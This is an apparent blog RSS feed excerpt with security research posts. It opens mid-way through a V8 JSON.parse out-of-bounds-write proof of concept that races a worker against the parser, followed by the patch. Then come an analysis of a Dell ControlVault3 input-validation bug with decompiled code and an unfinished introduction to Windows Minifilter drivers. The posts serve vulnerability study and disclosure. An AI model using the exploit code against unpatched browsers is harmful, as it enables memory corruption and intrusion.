class="hljs-title">corruptInBackground</span>(<span class="hljs-params">address</span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">workerTemplate</span>(<span class="hljs-params">address</span>) </span>{        <span class="hljs-keyword">let</span> memory = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(<span class="hljs-keyword">new</span> Sandbox.MemoryView(<span class="hljs-number">0</span>, <span class="hljs-number">0x100000000</span>));        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {            memory.setUint8(address, <span class="hljs-number">0x30</span>, <span class="hljs-literal">true</span>);            memory.setUint8(address, <span class="hljs-number">0xcf</span>, <span class="hljs-literal">true</span>);        }    }    <span class="hljs-keyword">const</span> workerCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(        <span class="hljs-string">`(<span class="hljs-subst">${workerTemplate}</span>)(<span class="hljs-subst">${address}</span>)`</span>);    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Worker(workerCode, { <span class="hljs-attr">type</span>: <span class="hljs-string">&apos;function&apos;</span> });}<span class="hljs-keyword">let</span> v14_addr = Sandbox.getAddressOf(v14);print(<span class="hljs-string">&quot;v14_addr: 0x&quot;</span> + v14_addr.toString(<span class="hljs-number">16</span>));<span class="hljs-comment">// Address of the singeel byte in the one byte string</span><span class="hljs-keyword">const</span> c = sbx_memory.getUint8(v14_addr + <span class="hljs-number">16</span>);print(<span class="hljs-string">&quot;c: 0x&quot;</span> + c.toString(<span class="hljs-number">16</span>));corruptInBackground(v14_addr + <span class="hljs-number">16</span>)<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {    <span class="hljs-keyword">try</span> {        <span class="hljs-built_in">JSON</span>.parse(v14);    } <span class="hljs-keyword">catch</span> (e) {        print(e)    }}</code></pre><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><ul><li>&#xD328;&#xCE58; commit<ul><li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/6448401">https://chromium-review.googlesource.com/c/v8/v8/+/6448401</a></li></ul></li></ul><p><code>JsonParser&lt;Char&gt;::DecodeString</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xB294; &#xBC18;&#xBCF5;&#xBB38; &#xC548;&#xC5D0; &#xBB38;&#xC790;&#xC5F4; &#xAE38;&#xC774;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs diff">diff --git a/src/json/json-parser.cc b/src/json/json-parser.ccindex abc1234..def5678 100644<span class="hljs-comment">--- a/src/json/json-parser.cc</span><span class="hljs-comment">+++ b/src/json/json-parser.cc</span><span class="hljs-meta">@@ -1,26 +1,29 @@</span>   Handle&lt;SeqTwoByteString&gt; intermediate =       factory()-&gt;NewRawTwoByteString(string.length()).ToHandleChecked();   return DecodeString(string, intermediate, hint); }  template &lt;typename Char&gt; template &lt;typename SinkChar&gt; void JsonParser&lt;Char&gt;::DecodeString(SinkChar* sink, uint32_t start,                                     uint32_t length) {<span class="hljs-deletion">-  SinkChar* sink_start = sink;</span>   const Char* cursor = chars_ + start;<span class="hljs-deletion">-  while (true) {</span><span class="hljs-deletion">-    const Char* end = cursor + length - (sink - sink_start);</span><span class="hljs-deletion">-    cursor = std::find_if(cursor, end, [&amp;sink](Char c) {</span><span class="hljs-deletion">-      if (c == &apos;\\&apos;) return true;</span><span class="hljs-deletion">-      *sink++ = c;</span><span class="hljs-deletion">-      return false;</span><span class="hljs-deletion">-    });</span><span class="hljs-deletion">-</span><span class="hljs-deletion">-    if (cursor == end) return;</span><span class="hljs-addition">+  while (length &gt; 0) {</span><span class="hljs-addition">+    // Copy everything until the first escape character</span><span class="hljs-addition">+    const Char* backslash_pos = std::find(cursor, cursor + length, &apos;\\&apos;);</span><span class="hljs-addition">+    size_t to_copy = backslash_pos - cursor;</span><span class="hljs-addition">+    std::copy_n(cursor, to_copy, sink);</span><span class="hljs-addition">+    length -= to_copy;</span><span class="hljs-addition">+    cursor += to_copy;</span><span class="hljs-addition">+    sink += to_copy;</span><span class="hljs-addition">+</span><span class="hljs-addition">+    if (length == 0) return;</span>      cursor++;      switch (GetEscapeKind(character_json_scan_flags[*cursor])) {       case EscapeKind::kSelf:         *sink++ = *cursor;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kBackspace:         *sink++ = &apos;\x08&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kTab:         *sink++ = &apos;\x09&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kNewLine:         *sink++ = &apos;\x0A&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kFormFeed:         *sink++ = &apos;\x0C&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kCarriageReturn:         *sink++ = &apos;\x0D&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kUnicode: {         base::uc32 value = 0;         for (int i = 0; i &lt; 4; i++) {           value = value * 16 + base::HexValue(*++cursor);         }         if (value &lt;=             static_cast&lt;base::uc32&gt;(unibrow::Utf16::kMaxNonSurrogateCharCode)) {           *sink++ = value;<span class="hljs-addition">+          length--;</span>         } else {<span class="hljs-addition">+          SBXCHECK_GE(length, 2);</span>           *sink++ = unibrow::Utf16::LeadSurrogate(value);           *sink++ = unibrow::Utf16::TrailSurrogate(value);<span class="hljs-addition">+          length -= 2;</span>         }         break;       }</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse</a></li><li><a href="https://ecma-international.org/publications-and-standards/standards/ecma-404/">https://ecma-international.org/publications-and-standards/standards/ecma-404/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/v8/">v8</category>
      
      <category domain="https://hackyboiz.github.io/tags/json/">json</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob-write/">oob write</category>
      
      <category domain="https://hackyboiz.github.io/tags/d4tura/">d4tura</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/19/d4tura/2025-08-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-24919 : Dell ControlVault3의 입력 검증 미흡으로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/16/j0ker/2025-08-16/</link>
      <guid>https://hackyboiz.github.io/2025/08/16/j0ker/2025-08-16/</guid>
      <pubDate>Sat, 16 Aug 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2153"><strong>Dell ControlVault3 cvhDecapsulateCmd improper input validation vulnerability</strong></a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Broadcom BCM5820X</li><li>Dell ControlVault3 5.14.3.0</li><li>Dell ControlVault3 Driver and Firmware prior to 5.15.10.14</li><li>Dell ControlVault3 Plus Driver and Firmware prior to 6.2.26.36</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Dell ControlVault3&#xC740; &#xC0DD;&#xCCB4;&#xC778;&#xC2DD;, &#xBCF4;&#xC548;&#xCF54;&#xB4DC; &#xB4F1;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158;&#xC73C;&#xB85C;, Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; bcmbipdll.dll &#xB0B4; <code>cvhDecapsulateCmd</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD38C;&#xC6E8;&#xC5B4;&#xC640; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBCF4;&#xB0BC; &#xB54C; <code>InitParam_List</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB450; &#xAC1C;&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0;, &#xBAA8;&#xB450; &#xD0C0;&#xC785;&#xACFC; &#xAE38;&#xC774;&#xB97C; &#xD3EC;&#xD568;&#xD55C; 8&#xBC14;&#xC774;&#xD2B8; &#xD5E4;&#xB354;&#xC640; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC774;&#xB904;&#xC838;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB450; &#xB370;&#xC774;&#xD130;&#xB294; &#xD558;&#xB098;&#xB294; &#xC778;&#xD48B;, &#xD558;&#xB098;&#xB294; &#xC544;&#xC6C3;&#xD48B;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, &#xD38C;&#xC6E8;&#xC5B4;&#xB85C;&#xBD80;&#xD130; &#xC804;&#xB2EC;&#xBC1B;&#xB294; &#xC544;&#xC6C3;&#xD48B;&#xC740; <code>cvhDecapsulateCmd</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xAC00; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">cvhDecapsulateCmd</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        cv_out_buffer *encapsulated_cmd, <span class="hljs-comment">//data coming from the firmware</span></span></span><span class="hljs-function"><span class="hljs-params">        cv_session_info *session,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *pNumParams,  <span class="hljs-comment">// ouput of the function, total number of parameters unpacked</span></span></span><span class="hljs-function"><span class="hljs-params">        cv_param_list_entry **dst_params)</span>  <span class="hljs-comment">//[0]</span></span><span class="hljs-function"></span>{    (...) <span class="hljs-comment">// skipped variable definition</span>  dst_params_ = dst_params;  pNumParams_ = pNumParams;  cur_param_num = <span class="hljs-number">0</span>i64;  <span class="hljs-keyword">if</span> ( (encapsulated_cmd-&gt;header.field_A &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> || (decryptedCmdSize = <span class="hljs-number">0</span>, encapsulated_cmd-&gt;header.field_8 == <span class="hljs-number">4</span>) )  {    cur_pos_buffer = &amp;encapsulated_cmd-&gt;first_byte;    v25 = &amp;encapsulated_cmd-&gt;first_byte + encapsulated_cmd-&gt;header.cmd_size;    v39 = v25;    <span class="hljs-keyword">goto</span> SKIP_DECRYPTION;  }    (...) <span class="hljs-comment">// skipped case where data is encrypted</span>SKIP_DECRYPTION:      <span class="hljs-keyword">if</span> ( cur_pos_buffer &gt;= v25 )      {        *pNumParams_ = cur_param_num;        <span class="hljs-keyword">goto</span> DONE;      }      param_type = cur_pos_buffer-&gt;paramType;      <span class="hljs-keyword">if</span> ( cur_pos_buffer-&gt;paramType &gt;= <span class="hljs-number">2</span> &amp;&amp; cur_pos_buffer-&gt;paramType - <span class="hljs-number">2</span> &gt;= <span class="hljs-number">2</span> )   <span class="hljs-comment">// ParamType is between 0 and 3</span>      {        <span class="hljs-keyword">if</span> ( bLoggingStuff )        {          log_more_stuff(            <span class="hljs-string">&quot;d:\\BuildAutomation\\BCMSecurity_int_cs_5.14\\sw\\phoenixII\\host\\windows\\BCMSecurity\\BCMSecurity\\src\\B&quot;</span>            <span class="hljs-string">&quot;CMIDll\\BCMILib_Src\\HelperFunctions.c&quot;</span>);          log_stuff(<span class="hljs-string">&quot;%s %s%s:%d %s\n&quot;</span>, <span class="hljs-string">&quot;Invalid Status Type&quot;</span>, v51, &amp;pNumParams_, <span class="hljs-number">888</span>i64, <span class="hljs-string">&quot;is_valid_param_type&quot;</span>);        }        status_ = INVALID_PARAM_TYPE;        <span class="hljs-keyword">goto</span> DONE;      }      status_ = <span class="hljs-number">0</span>;      status = encapsulated_cmd-&gt;header.status;      <span class="hljs-keyword">if</span> ( !status || status == <span class="hljs-number">143</span> || status == <span class="hljs-number">41</span> || status == <span class="hljs-number">154</span> &amp;&amp; param_type != CV_PACK_MAGIC_BUFFER )      {COPY_PARAM_CONTENT:        Size = <span class="hljs-number">0</span>i64;        param_size = cur_pos_buffer-&gt;paramLen + <span class="hljs-number">8</span>;        decryptedCmdSize = param_size;        v49 = param_size;        param_buffer = j__malloc_base(param_size);    <span class="hljs-comment">// Allocates a buffer with a +8 size to account for the header (type, length)</span>        param_buffer_ = param_buffer;        Size = param_buffer;        <span class="hljs-keyword">if</span> ( !param_buffer )        {          status_ = MEM_ERROR;          free_stuff(&amp;Size, <span class="hljs-number">1u</span>);          <span class="hljs-keyword">goto</span> DONE;        }        <span class="hljs-built_in">memset</span>(param_buffer, <span class="hljs-number">0</span>, param_size);        v32 = param_size;        param_size_aligned = param_size &amp; <span class="hljs-number">0xFFFFFFFC</span>;        param_size_reminder_non_aligned = v32 &amp; <span class="hljs-number">3</span>;        <span class="hljs-keyword">if</span> ( !param_size_reminder_non_aligned )          param_size_aligned = decryptedCmdSize;        v35 = param_buffer_;        <span class="hljs-keyword">if</span> ( param_size_aligned &gt;= <span class="hljs-number">4</span> )        {          memmove(param_buffer_, cur_pos_buffer, param_size_aligned);    <span class="hljs-comment">// [1] copy to param_buffer the parameter entry, including the header coming from the cmd header</span>          v35 = &amp;param_buffer_[param_size_aligned];          Size = &amp;param_buffer_[param_size_aligned];          cur_pos_buffer = (cur_pos_buffer + param_size_aligned);        }</code></pre><p><code>cvhDecapsulateCmd</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD5E4;&#xB354;&#xC640; &#xD568;&#xAED8; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xD5E4;&#xB354;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; 8 &#xD06C;&#xAC8C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">  <span class="hljs-keyword">if</span> ( param_size_reminder_non_aligned )  {    memmove(v35, cur_pos_buffer, param_size_reminder_non_aligned);    cur_pos_buffer = (cur_pos_buffer + <span class="hljs-number">4</span>);  }  Size = param_buffer_;  v36 = &amp;dst_params_[cur_param_num];  **v36 = <span class="hljs-number">0</span>i64;  memmove(*v36, param_buffer_, v49);   <span class="hljs-comment">//[2] copy the whole parameter entry including its header to the cur_param_num entry of the dst_params buffer (aka the decapsulated parameters) </span>  <span class="hljs-keyword">if</span> ( param_buffer_ )    <span class="hljs-built_in">free</span>(param_buffer_);  <span class="hljs-keyword">goto</span> NEXT_PARAM;}</code></pre><p> [1]&#xC5D0;&#xC11C; &#xBCF5;&#xC0AC;&#xD55C; &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCD9C;&#xB825; &#xAD6C;&#xC870;&#xCCB4; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">           (...) <span class="hljs-comment">// skipped handling of other edge cases</span>NEXT_PARAM:      cur_param_num = (cur_param_num + <span class="hljs-number">1</span>);      cur_param_num_ = cur_param_num;      <span class="hljs-keyword">if</span> ( cur_param_num &gt; <span class="hljs-number">0x18</span> )   <span class="hljs-comment">// [3]  there&apos;s no check if the number of parameters parsed doesn&apos;t go beyond the request number of parameters in *pNumParameters, leading to a potential wild memcpy at [2]</span>      {        status_ = CV_STATUS_TOO_MANY_PARAM;        <span class="hljs-keyword">goto</span> DONE;      }    }  }</code></pre><p>&#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xB85C;&#xBD80;&#xD130; &#xC218;&#xC2E0;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xBA74;&#xC11C; 0x18 &#xAC1C; &#xC774;&#xC0C1; &#xBCF5;&#xC0AC;&#xD560; &#xACBD;&#xC6B0; &#xB370;&#xC774;&#xD130; &#xBCF5;&#xC0AC;&#xB97C; &#xC911;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xCD9C;&#xB825; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xCCB4; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xBA87; &#xAC1C;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xACE0; &#xBCF5;&#xC0AC;&#xD55C; &#xAC2F;&#xC218;&#xAC00; &#xD574;&#xB2F9; &#xB9AC;&#xC2A4;&#xD2B8; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xB192;&#xC740;&#xC9C0;&#xB294; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC545;&#xC758;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xB41C; &#xD38C;&#xC6E8;&#xC5B4;&#xC640; &#xD1B5;&#xC2E0;&#xD560; &#xACBD;&#xC6B0;, &#xC774;&#xB97C; &#xD1B5;&#xD574; OOB&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/deserialization/">deserialization</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Dell/">Dell</category>
      
      <category domain="https://hackyboiz.github.io/tags/ControlVault3/">ControlVault3</category>
      
      <category domain="https://hackyboiz.github.io/tags/cvhDecapsulateCmd/">cvhDecapsulateCmd</category>
      
      <category domain="https://hackyboiz.github.io/tags/bcmbipdll-dll/">bcmbipdll.dll</category>
      
      <category domain="https://hackyboiz.github.io/tags/improper-input-validation/">improper input validation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/16/j0ker/2025-08-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Walking Through Windows Minifilter Drivers (EN)</title>
      <link>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/en/</link>
      <guid>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/en/</guid>
      <pubDate>Fri, 15 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is banda. This is my first time greeting you with an article on Windows Minifilter Drivers. &amp;#x1F917;&lt;/p&gt;
&lt;p&gt;While studying W</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is banda. This is my first time greeting you with an article on Windows Minifilter Drivers. &#x1F917;</p><p>While studying Windows Kernel Drivers recently, I discovered that there are various types of drivers categorized by purpose, such as Bus Drivers, Filter Drivers, FSDs, and Minifilters. I became curious about the structural differences between Bus or Filter Drivers and traditional Function Drivers, as well as how vulnerabilities manifest in these different types.</p><p>Today, we will explore the structure and operation of Minifilter Drivers, examine their internal components, and analyze potential vulnerabilities.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image1.png" alt></p><h1 id="1-About-Minifilter-Drivers"><a href="#1-About-Minifilter-Drivers" class="headerlink" title="1. About Minifilter Drivers"></a>1. About Minifilter Drivers</h1><hr><p>A Minifilter driver is a specialized type of driver in Windows designed to monitor, intercept, and modify file system I/O requests such as file creation, opening, reading, writing, and deletion. It is commonly used for precise monitoring of file system activity.</p><p>If you think about it in terms of <strong>&#x201C;monitoring, blocking, or modifying file access&#x201D;</strong>, it starts to sound familiar, doesn&#x2019;t it? Indeed &#x2014; this functionality is well-suited for products like <strong>antivirus software, EDR solutions, and backup programs</strong>. In fact, I&#x2019;ve personally confirmed that many such products rely on Minifilter drivers.</p><p>A Minifilter driver can intercept or manipulate the following three types of requests:</p><ol><li>IRP (I/O Request Packet)</li><li>Fast I/O</li><li>File System Filter Callbacks</li></ol><h2 id="1-1-Filter-Manager-&#x2192;-Minifilter-Flow"><a href="#1-1-Filter-Manager-&#x2192;-Minifilter-Flow" class="headerlink" title="1.1 Filter Manager &#x2192; Minifilter Flow"></a>1.1 Filter Manager &#x2192; Minifilter Flow</h2><p>A Minifilter operates on top of the Windows Filter Manager (<code>fltmgr.sys</code>). The Filter Manager receives file I/O requests from the I/O Manager and forwards them to the registered Minifilter drivers in the order determined by their <strong>altitude</strong>. In other words, the altitude controls the order in which filters are loaded and invoked.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image2.gif" alt></p><p>Let&#x2019;s take a look at how file I/O requests are processed in Windows.</p><ol><li>An application issues an I/O operation by calling APIs such as <code>CreateFile</code>, <code>ReadFile</code>, or <code>WriteFile</code>.</li><li>The I/O Manager receives this request and forwards it to the Filter Manager (<code>fltmgr.sys</code>).</li><li>The Filter Manager checks the list of all registered Minifilter drivers and passes the request to each driver in the order of their altitude.</li><li>After the Minifilter completes its processing, the request is passed on to the file system filter driver.</li><li>Finally, the request is delivered to the disk driver (Storage Driver Stack), which accesses the physical disk or processes the data accordingly.</li></ol><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image3.png" alt></p><p>You can check the list of Minifilter drivers loaded on the system by running the <code>fltmc</code> command in the Command Prompt.</p><p>The higher the altitude value, the higher the priority, meaning the Minifilter can intercept or modify I/O requests earlier. However, the processing order differs depending on whether it is a pre-operation or post-operation callback.</p><ul><li><strong>Pre-operation</strong>: Called in <strong>descending altitude order</strong> (high &#x2192; low)</li><li><strong>Post-operation</strong>: Called in <strong>ascending altitude order</strong> (low &#x2192; high)</li></ul><p>Looking back at the overall flow&#x2026; a Minifilter driver does not directly handle IRPs in the traditional way.</p><p>Instead, the Filter Manager receives I/O requests on its behalf and passes them to the Minifilter through callback functions.</p><p>In other words, a Minifilter driver does <strong>not</strong> need to set up the <strong>DispatchRoutine</strong> that we commonly associate with traditional drivers!</p><h2 id="1-2-Minifilter-Callback-Routine"><a href="#1-2-Minifilter-Callback-Routine" class="headerlink" title="1.2 Minifilter Callback Routine"></a>1.2 Minifilter Callback Routine</h2><p>How can a Minifilter driver operate only on specific file operations?</p><p>This is possible thanks to a mechanism called <strong>callbacks</strong>.</p><p>As mentioned earlier, a Minifilter driver does <strong>not</strong> directly process IRPs through a <code>DispatchRoutine</code>.</p><p>Instead, it can &#x201C;hook&#x201D; I/O requests delivered via the Filter Manager.</p><p>By registering <strong>pre-operation (<code>PreOperation Callback</code>)</strong> and <strong>post-operation (<code>PostOperation Callback</code>)</strong> callbacks, a Minifilter can monitor or control I/O operations at the system level when they occur.</p><ul><li><strong>Pre-operation callback (<code>PFLT_PRE_OPERATION_CALLBACK</code>)</strong></li></ul><pre><code class="hljs c">PFLT_PRE_OPERATION_CALLBACK PfltPreOperationCallback;<span class="hljs-function">FLT_PREOP_CALLBACK_STATUS <span class="hljs-title">PfltPreOperationCallback</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, out] PFLT_CALLBACK_DATA Data,</span></span><span class="hljs-function"><span class="hljs-params">  [in]      PCFLT_RELATED_OBJECTS FltObjects,</span></span><span class="hljs-function"><span class="hljs-params">  [out]     PVOID *CompletionContext</span></span><span class="hljs-function"><span class="hljs-params">)</span></span><span class="hljs-function"></span>{...}</code></pre><p>Called before the I/O request is passed to the file system or lower drivers.</p><p>This is where the core logic of the Minifilter runs, with powerful capabilities such as returning</p><p><code>FLT_PREOP_COMPLETE</code>, <code>FLT_PREOP_SUCCESS_WITH_CALLBACK</code>, or <code>FLT_PREOP_SUCCESS_NO_CALLBACK</code>.</p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_pre_operation_callback"><strong>PFLT_PRE_OPERATION_CALLBACK callback function (fltkernel.h)</strong></a></p><ul><li><strong>Post-operation callback (<code>PFLT_POST_OPERATION_CALLBACK</code>)</strong></li></ul><pre><code class="hljs c">PFLT_POST_OPERATION_CALLBACK PfltPostOperationCallback;<span class="hljs-function">FLT_POSTOP_CALLBACK_STATUS <span class="hljs-title">PfltPostOperationCallback</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, out]      PFLT_CALLBACK_DATA Data,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           PCFLT_RELATED_OBJECTS FltObjects,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] PVOID CompletionContext,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           FLT_POST_OPERATION_FLAGS Flags</span></span><span class="hljs-function"><span class="hljs-params">)</span></span><span class="hljs-function"></span>{...}</code></pre><p>Called on the way back after the I/O request has been fully processed by lower drivers and the file system.</p><p>It is typically used to verify the success of the operation, log results, or modify the outcome if needed.</p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_post_operation_callback"><strong>PFLT_POST_OPERATION_CALLBACK callback function (fltkernel.h)</strong></a></p><p>In short, these callbacks are registered in the <code>FLT_OPERATION_REGISTRATION</code> structure, which specifies <strong>which pre-/post-operation callbacks are associated with which I/O operations (MajorFunctions)</strong>.</p><hr><h2 id="1-3-Communication-Between-Minifilter-and-User-Mode"><a href="#1-3-Communication-Between-Minifilter-and-User-Mode" class="headerlink" title="1.3 Communication Between Minifilter and User-Mode"></a>1.3 Communication Between Minifilter and User-Mode</h2><p>Communication between a Minifilter driver and a User-Mode application is handled via a <strong>filter communication port</strong>.</p><p>This port acts as a dedicated high-speed communication channel between the Minifilter and the application, allowing safe message exchange between Kernel-Mode drivers and User-Mode processes.</p><p>Let&#x2019;s look into the code and explore the APIs provided by Microsoft for this purpose.</p><h3 id="Driver-Code"><a href="#Driver-Code" class="headerlink" title="Driver Code"></a>Driver Code</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fltKernel.h&gt;</span></span>PFLT_FILTER gFilter = <span class="hljs-literal">NULL</span>;PFLT_PORT gServerPort = <span class="hljs-literal">NULL</span>, gClientPort = <span class="hljs-literal">NULL</span>;<span class="hljs-function">VOID <span class="hljs-title">OnDisconnect</span><span class="hljs-params">(PVOID Cookie)</span> </span>{    UNREFERENCED_PARAMETER(Cookie);    FltCloseClientPort(gFilter, &amp;gClientPort);    gClientPort = <span class="hljs-literal">NULL</span>;}<span class="hljs-function">NTSTATUS <span class="hljs-title">OnConnect</span><span class="hljs-params">(PFLT_PORT ClientPort, PVOID SrvCookie, PVOID Ctx, ULONG Size, PVOID* ConnCookie)</span> </span>{    UNREFERENCED_PARAMETER(SrvCookie);    UNREFERENCED_PARAMETER(Ctx);    UNREFERENCED_PARAMETER(Size);    UNREFERENCED_PARAMETER(ConnCookie);    gClientPort = ClientPort;    <span class="hljs-keyword">return</span> STATUS_SUCCESS;}<span class="hljs-function">FLT_PREOP_CALLBACK_STATUS <span class="hljs-title">PreCreate</span><span class="hljs-params">(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* Buff)</span> </span>{    UNREFERENCED_PARAMETER(FltObjects);    UNREFERENCED_PARAMETER(Buff);    PFLT_FILE_NAME_INFORMATION nameInfo;    <span class="hljs-keyword">if</span> (gClientPort &amp;&amp; NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &amp;nameInfo))) {        FltSendMessage(gFilter, &amp;gClientPort, nameInfo-&gt;Name.Buffer, nameInfo-&gt;Name.Length, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);        FltReleaseFileNameInformation(nameInfo);    }    <span class="hljs-keyword">return</span> FLT_PREOP_SUCCESS_NO_CALLBACK;}<span class="hljs-function">NTSTATUS <span 